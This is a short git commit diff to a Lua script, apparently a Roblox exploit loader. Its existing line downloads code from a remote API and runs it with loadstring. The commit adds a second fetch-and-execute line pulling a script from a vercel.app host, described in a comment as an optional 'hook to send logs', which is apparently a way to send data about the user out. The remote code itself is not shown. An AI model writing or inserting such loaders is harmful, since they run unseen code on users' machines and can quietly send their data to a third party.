2fd876f4609834c38854bdbf72554ca647465196
ArchIsDead <ccryptohigh@gmail.com>
2026-01-26 19:23:14 +0700

    Update &R4-Lock.lua

--- &R4-Lock.lua
+++ &R4-Lock.lua
@@ -1,1 +1,3 @@
 loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/e672a3389a2a76b9b720d1ab156021bb6955ea26cf488fc64af5529a55ad36b7/download"))()
+-- under is a hook to send logs(optional if you want to remove it)
+loadstring(game:HttpGet("https://r4-sec.vercel.app/files/6cc27230d2ea05ffe38a2e0eea90013c"))()
